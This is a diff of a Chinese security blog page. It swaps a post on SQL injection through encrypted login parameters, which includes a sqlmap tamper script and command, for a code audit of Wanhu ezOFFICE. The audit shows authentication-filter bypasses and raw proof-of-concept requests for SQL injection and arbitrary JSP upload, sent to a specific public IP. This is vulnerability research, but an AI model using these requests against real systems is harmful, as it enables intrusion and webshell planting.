@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="前端加密下的一次sql注入, 渗透测试,漏洞挖掘,攻防对抗">
+    <meta name="keywords" content="对万户ezOFFICE的一次代码审计, 渗透测试,漏洞挖掘,攻防对抗">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>前端加密下的一次sql注入 | m1k0er&#39;Blogs</title>
+    <title>对万户ezOFFICE的一次代码审计 | m1k0er&#39;Blogs</title>
     <link rel="icon" type="image/jpeg" href="/medias/2.jpeg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -290,12 +290,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/33.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/27.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">前端加密下的一次sql注入</h1>
+                    <h1 class="description center-align post-title">对万户ezOFFICE的一次代码审计</h1>
                 </div>
             </div>
         </div>
@@ -411,8 +411,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                <span class="chip bg-color">渗透测试</span>
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                <span class="chip bg-color">代码审计</span>
                             </a>
                         
                     </div>
@@ -423,8 +423,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                渗透测试
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
                             </a>
                         
                     </div>
@@ -457,69 +457,81 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前阵子做项目的时候，遇到一个站点登录处存在sql注入，且登录包都经过了加密处理，最后通过编写tamper对sqlmap的payload进行加密，成功跑出了数据。</p>
-<h2 id="0x01-发现加密"><a href="#0x01-发现加密" class="headerlink" title="0x01 发现加密"></a>0x01 发现加密</h2><p>发现注入,当输入<code>admin&#39;</code>时，提示请求错误</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221217173406681.png"></p>
-<p>输入<code>admin&#39;&#39;</code>时，提示用户不存在，由此判断可能存在注入</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221217173533744.png"></p>
-<p>抓包检测时，发现数据都已经经过了加密处理</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221217173741210.png"></p>
-<p>F12分析源代码查找加密方式</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221217174007572.png"></p>
-<p>简单分析下这个代码块，<code>c_uid</code>是输入的用户名，<code>c_pwd</code>是输入的密码，<code>c_check_id </code>是验证码，后面的<code>c_check_1 </code>和<code>c_check_2</code>我们可以直接指定为0或者1，然后拼接成<code>c_uid + &quot;|&quot; + c_pwd + &quot;|&quot; + c_check_id + &quot;|&quot; + c_check_1 + &quot;|&quot; + c_check_2</code>的形式再通过string2unicode进行加密，全局搜索string2unicode，在common.1.2.js获取到加密方式</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221217175236482.png"></p>
-<h2 id="0x02-编写tamper"><a href="#0x02-编写tamper" class="headerlink" title="0x02 编写tamper"></a>0x02 编写tamper</h2><p>将加密方式保存为1.js</p>
-<pre><code>function string2unicode(str) &#123;
-    var value = &#39;&#39;;
-    for (var i = 0; i &lt; str.length; i++) &#123;
-        var c_1 = left_zero_4(parseInt(str.charCodeAt(i)).toString(16));
-        var c_2 = c_1.substring(2, 4);
-        value += c_2 + c_1;
-    &#125;
-    return value;
-&#125;
-function left_zero_4(str) &#123;
-    if (str != null &amp;&amp; str != &#39;&#39; &amp;&amp; str != &#39;undefined&#39;) &#123;
-        if (str.length == 2) &#123;
-            return &#39;00&#39; + str;
-        &#125;
-    &#125;
-    return str;
-&#125;</code></pre>
-<p>编写tamper加载1.js对payload进行加密</p>
-<pre><code>#!/usr/bin/env python
+                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在一次攻防演练中，遇到这套系统，于是跟人要了套源码，记录下自己审计出来的问题点。</p>
+<h2 id="0x01-Filter绕过1"><a href="#0x01-Filter绕过1" class="headerlink" title="0x01 Filter绕过1"></a>0x01 Filter绕过1</h2><p>首先还是先从web.xml开始审计，我们定位到SetCharacterEncodingFilter过滤器</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221218021213042.png"></p>
+<p>跟进到SetCharacterEncodingFilter看看具体是怎么过滤的</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221218021527708.png"></p>
+<p>定位到84行代码块，这里的var6是获取请求路径的后缀，当访问的后缀是<code>.jsp</code>的时候，如果session中的userId值为空，则跳转到登录页面，反之进入doFilter，这里绕过思路就很简单了，只要获取的后缀不为jsp就行了，在前面的文章我们讲过了，如果在URL中引入分号<code>;</code>，通常是不会对正常接口造成影响的，即我们可以通过<code>https://xxx.com/1.jsp;123</code>这种形式的路径来绕过Filter。</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221218172520564.png"></p>
+<h2 id="0x02-Filter绕过2"><a href="#0x02-Filter绕过2" class="headerlink" title="0x02 Filter绕过2"></a>0x02 Filter绕过2</h2><p>同样是SetCharacterEncodingFilter过滤器，定位到第49行</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221218204613731.png"></p>
+<p>这里使用getRequestURI来获取当前请求url的路径文件，在前面的文章我们也总结了，如果使用了getRequestURI，我们可以构造<code>../</code>来跳转目录，在52行做了一个判断，如果路径为<code>/iWebOfficeSign/OfficeServer.jsp</code>，则直接进入doFilter，那我们可以构造<code>http://223.247.200.157/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/1.jsp</code>这种的路径，来达到绕过Filter的目的。</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221218205307190.png"></p>
+<h2 id="0x03-SQL注入"><a href="#0x03-SQL注入" class="headerlink" title="0x03 SQL注入"></a>0x03 SQL注入</h2><h3 id="1、DocumentHistory-jsp"><a href="#1、DocumentHistory-jsp" class="headerlink" title="1、DocumentHistory.jsp"></a>1、DocumentHistory.jsp</h3><p>配合上面的权限绕过，很容易找到一个注入点，漏洞存在于public/iSignatureHTML.jsp/DocumentHistory.jsp，</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221218205759015.png"></p>
+<p>直接对DocumentID进行了拼接</p>
+<pre><code>POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentHistory.jsp HTTP/1.1
+Host: 223.247.200.157
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: OASESSIONID=F03F57D030ED0968BD42F7305C2B9A41; OASESSIONID=B291A457048C80751071A5BAE523BD67; LocLan=zh_CN
+Connection: close
+Content-Length: 67
+Content-Type: application/x-www-form-urlencoded
 
-import execjs
-import sys
-from lib.core.enums import PRIORITY
+DocumentID=1</code></pre>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221218210417659.png"></p>
+<h3 id="2、DocumentEdit-jsp"><a href="#2、DocumentEdit-jsp" class="headerlink" title="2、DocumentEdit.jsp"></a>2、DocumentEdit.jsp</h3><p>漏洞存在于<code>public/iWebRevision.jsp/DocumentEdit.jsp</code>，同样是直接做了个拼接</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221218224030937.png"></p>
+<pre><code>POST /defaultroot/public/iWebRevision.jsp/DocumentEdit.jsp;123 HTTP/1.1
+Host: 223.247.200.157
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: OASESSIONID=F03F57D030ED0968BD42F7305C2B9A41; OASESSIONID=B291A457048C80751071A5BAE523BD67; LocLan=zh_CN
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
 
-__priority__ = PRIORITY.LOW
+EditType=&amp;UserName=test&amp;RecordID=1</code></pre>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221218225446778.png"></p>
+<h2 id="0x04-任意文件上传"><a href="#0x04-任意文件上传" class="headerlink" title="0x04 任意文件上传"></a>0x04 任意文件上传</h2><p>漏洞路径为<code>/defaultroot/platform/portal/layout/common/upload.jsp</code>，在第16行设置保存文件路径，如果不存在则创建</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221220021311117.png"></p>
+<p>在46行通过getRandom()获取随即名并复制给myRandom变量，然后在第47行获取上传文件名，最后在第48行直接进行拼接并赋值给newFileName变量，在第52行定义了上传路径，datePath变量为myRandom的前6位数</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221220022625993.png"></p>
+<p>继续跟进后可以发现在else代码块做了一个文件上传的操作，且没有对上传的文件名后缀做任何过滤，造成任意文件上传漏洞。</p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221220023232302.png"></p>
+<p>漏洞poc如下：</p>
+<pre><code>POST /defaultroot/platform/portal/layout/common/upload.jsp;?portletSettingId=1&amp;path=test HTTP/1.1
+Host: 223.247.200.157
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: OASESSIONID=F03F57D030ED0968BD42F7305C2B9A41; OASESSIONID=B291A457048C80751071A5BAE523BD67; LocLan=zh_CN
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydwd0qWrXNQsKknSQ
+Content-Length: 182
 
-def dependencies():
-    pass
+------WebKitFormBoundarydwd0qWrXNQsKknSQ
+Content-Disposition: form-data; name=&quot;fileNames&quot;; filename=&quot;1.jsp&quot;
 
-def get_des_psswd(message):
-    jsstr = get_js()
-    ctx = execjs.compile(jsstr) 
-    return (ctx.call(&#39;string2unicode&#39;, message))
-
-def get_js():
-    f = open(&quot;1.js&quot;, &#39;r&#39;)
-    line = f.readline()
-    htmlstr = &#39;&#39;
-    while line:
-        htmlstr = htmlstr+line
-        line = f.readline()
-    return htmlstr
-
-
-def tamper(payload, **kwargs):
-    if payload:
-        data=get_des_psswd(payload) 
-    return data
+test
+------WebKitFormBoundarydwd0qWrXNQsKknSQ--
 </code></pre>
-<p>这里还有一个问题，就是我们的注入点是在<code>c_uid</code>参数，如果要成功跑出数据还需要考虑到<code>&quot;|&quot; + c_pwd + &quot;|&quot; + c_check_id + &quot;|&quot; + c_check_1 + &quot;|&quot; + c_check_2</code>的拼接问题，这里我们可以使用–suffix指定后缀，命令如下</p>
-<pre><code>sqlmap -u &quot;http://xxx/Web/LOGIN_TABLE.ashx?table=users&amp;OPTYPE=LOGIN_IN&amp;AJAXID=admin&quot; --suffix &quot;|123456|83959|0|0&quot; -tamper 1.py -p AJAXID</code></pre>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221220031730132.png"></p>
+<p>结合上面的权限绕过，最后的上传路径为<code>http://xxx/defaultroot/upload/test/202212/2022122003144987018496353.jsp;</code></p>
+<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221220031817095.png"></p>
 
                 
             </div>
@@ -546,7 +558,7 @@ def tamper(payload, **kwargs):
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/12/17/qian-duan-jia-mi-xia-de-yi-ci-sql-zhu-ru/">http://example.com/2022/12/17/qian-duan-jia-mi-xia-de-yi-ci-sql-zhu-ru/</a>
+                    <a href="http://example.com/2022/12/17/dui-wan-hu-ezoffice-de-yi-ci-dai-ma-shen-ji/">http://example.com/2022/12/17/dui-wan-hu-ezoffice-de-yi-ci-dai-ma-shen-ji/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -584,8 +596,8 @@ def tamper(payload, **kwargs):
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                    <span class="chip bg-color">渗透测试</span>
+                                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                    <span class="chip bg-color">代码审计</span>
                                 </a>
                             
                         </div>
@@ -755,9 +767,10 @@ def tamper(payload, **kwargs):
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/12/17/dui-wan-hu-ezoffice-de-yi-ci-dai-ma-shen-ji/">
                     <div class="card-image">
@@ -775,9 +788,9 @@ def tamper(payload, **kwargs):
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -790,6 +803,7 @@ def tamper(payload, **kwargs):
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -808,13 +822,13 @@ def tamper(payload, **kwargs):
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/12/08/java-biao-da-shi-zhu-ru/">
+                <a href="/2022/12/17/qian-duan-jia-mi-xia-de-yi-ci-sql-zhu-ru/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/24.jpg" class="responsive-img" alt="Java表达式注入">
+                        <img src="/medias/featureimages/33.jpg" class="responsive-img" alt="前端加密下的一次sql注入">
                         
-                        <span class="card-title">Java表达式注入</span>
+                        <span class="card-title">前端加密下的一次sql注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -825,14 +839,14 @@ def tamper(payload, **kwargs):
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-17
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
-                                    代码审计
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
@@ -842,8 +856,8 @@ def tamper(payload, **kwargs):
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                        <span class="chip bg-color">代码审计</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
                 </div>
